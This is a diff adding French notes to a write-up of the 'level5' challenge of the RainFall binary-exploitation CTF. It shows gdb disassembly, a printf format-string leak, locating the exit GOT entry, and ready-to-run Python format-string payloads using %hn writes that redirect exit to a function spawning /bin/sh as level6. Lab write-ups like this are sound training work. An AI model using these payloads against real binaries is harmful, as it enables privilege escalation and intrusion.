@@ -10,3 +10,54 @@ et on a déjà écrit 2052caractères donc
 Y = 33956 - 2052 = 31904
 
  (python -c 'print "\xdc\xf4\xff\xbf\xde\xf4\xff\xbf%2044d%5$hn%31904d%4$hn"'; cat) | ./level5
+
+On note une fonction o qui a pour code :
+
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   ebp
+   0x080484a5 <+1>:	mov    ebp,esp
+   0x080484a7 <+3>:	sub    esp,0x18
+   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+End of assembler dump.
+
+sachant que x/s 0x80485f0 => 0x80485f0:	 "/bin/sh"
+
+Appeler cette fonction o nous permettrait de lancer un shell avec le user level6
+
+l'adresse de o est la suivante : 0x080484a4
+
+Nous avons ici un printf qui apparait vulnérable :
+
+level5@RainFall:~$ python -c 'print "AAAA" + " %x" * 5' | ./level5
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
+
+Malheureusement, il est suivi d'un exit, nous ne pourrons donc pas remplacer l'eip de la fonction n par l'adresse de la fonction o.
+
+Par contre, on peut remplacer l'adresse de exit par celle de notre fonction o :
+
+Il faut trouver son adresse dans le GOT (_GLOBAL_OFFSET_TABLE_)
+
+objdump -R level5 | grep 'exit'
+=> 08049838 R_386_JUMP_SLOT   exit
+
+l'adresse de o commence aussi par 0804
+
+Ainsi il suffit de remplacer les 2 bytes de l'adresse basse : 9838 par 84a4 (adresse de o : 0x080484a4)
+
+Nous allons procéder avec un short write (%hn) comme pour le level4
+
+on va écrire :
+0x84a4 => 33956 caractères pour l'adresse basse (0x08049838 => \x38\x98\x04\x08)
+
+payload = "\x38\x98\x04\x08" + "%33952x" + "%4$hn"
+
+python -c 'print "\x38\x98\x04\x08%33952x%4$hn"' | ./level5
+
+avec un cat pour garder stdin open
+
+(python -c 'print "\x38\x98\x04\x08%33952x%4$hn"'; cat) | ./level5
+
